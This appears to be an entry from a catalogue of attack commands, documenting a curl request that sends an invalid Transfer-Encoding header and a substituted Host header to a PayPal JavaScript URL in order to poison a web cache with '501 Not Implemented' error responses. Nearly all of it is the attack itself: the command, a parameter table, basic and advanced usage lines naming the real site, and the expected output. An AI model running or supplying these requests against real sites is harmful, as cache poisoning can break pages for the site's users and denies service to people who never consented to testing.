---
data: >-
  curl -H "Transfer-Encoding: invalid" -H "Host: www.paypalobjects.com"
  https://www.paypal.com/path/to/js/file.js
tags:
  - http
  - cache-poisoning
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 8a2e80d4-64f8-4958-aa70-72e35eb7c012
created_at: '2025-12-13T09:01:16.914Z'
updated_at: '2025-12-13T09:01:16.914Z'
verified: false
validated: true
submitted: true
---
# Curl Send Crafted HTTP Request

## Command

```bash
curl -H "Transfer-Encoding: invalid" -H "Host: www.paypalobjects.com" https://www.paypal.com/path/to/js/file.js
```

## Description

This command uses curl to send a crafted HTTP request with an invalid Transfer-Encoding header to exploit web cache poisoning vulnerabilities, targeting specific resources to store error responses in the cache.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Transfer-Encoding: invalid"` | Adds invalid Transfer-Encoding header to poison cache | Yes |
| `-H "Host: www.paypalobjects.com"` | Specifies the host for the targeted resource | Yes |
| `https://www.paypal.com/path/to/js/file.js` | URL of the resource to poison | Yes |

## Examples

### Basic Usage

```bash
curl -H "Transfer-Encoding: invalid" -H "Host: www.paypalobjects.com" https://www.paypal.com/path/to/js/file.js
```

### Advanced Usage

```bash
curl -H "Transfer-Encoding: invalid" -H "Host: www.paypalobjects.com" -v https://www.paypal.com/another/path/to/js/file.js
```

## Expected Output

Server responds with '501 Not Implemented', indicating successful poisoning if the cache stores it.

## Related

- [[procedures/Poison-Web-Cache-Using-Invalid-Transfer-Encoding-Header]]
